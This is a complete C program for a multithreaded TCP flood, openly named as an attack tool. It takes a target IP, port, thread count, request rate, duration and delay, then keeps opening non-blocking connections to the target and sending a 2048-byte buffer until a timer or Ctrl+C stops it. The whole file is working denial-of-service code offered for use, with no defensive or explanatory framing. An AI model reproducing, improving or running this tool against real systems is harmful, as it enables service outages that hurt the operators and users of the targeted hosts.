#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>

int keep_running = 1;

void intHandler(int dummy) {
    keep_running = 0;
}

struct attack_info {
    char *target_ip;
    int port;
    int rps;
    int duration;
    int delay_us;
};

void set_nonblocking(int sock) {
    int opts = fcntl(sock, F_GETFL);
    if (opts < 0) {
        perror("fcntl(F_GETFL)");
        exit(EXIT_FAILURE);
    }
    opts = (opts | O_NONBLOCK);
    if (fcntl(sock, F_SETFL, opts) < 0) {
        perror("fcntl(F_SETFL)");
        exit(EXIT_FAILURE);
    }
}

void *flood(void *arg) {
    struct attack_info *info = (struct attack_info *)arg;
    struct sockaddr_in target_addr;
    int sock, i;
    char buffer[2048]; // Increase request size for larger payload

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(info->port);
    target_addr.sin_addr.s_addr = inet_addr(info->target_ip);

    while (keep_running) {
        for (i = 0; i < info->rps; i++) {
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) {
                perror("Socket creation failed");
                continue;
            }

            set_nonblocking(sock);

            if (connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0 && errno != EINPROGRESS) {
                perror("Connection failed");
                close(sock);
                continue;
            }

            // Send data after connection, ignoring errors
            send(sock, buffer, sizeof(buffer), 0);
            close(sock); // Close to ensure rapid reconnections

            usleep(info->delay_us); // Introduce a delay (in microseconds) between requests
        }
    }

    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 7) {
        printf("Usage: %s IP port threads rps time delay_us\n", argv[0]);
        return -1;
    }

    char *target_ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    int rps = atoi(argv[4]);
    int duration = atoi(argv[5]);
    int delay_us = atoi(argv[6]); // New argument for delay in microseconds

    pthread_t thread_ids[threads];
    struct attack_info info;
    info.target_ip = target_ip;
    info.port = port;
    info.rps = rps;
    info.duration = duration;
    info.delay_us = delay_us; // Set the delay

    signal(SIGINT, intHandler); // To stop the attack gracefully with Ctrl+C

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, flood, &info) != 0) {
            perror("Failed to create thread");
            return -1;
        }
    }

    sleep(duration);
    keep_running = 0;

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("Attack finished.\n");
    return 0;
}
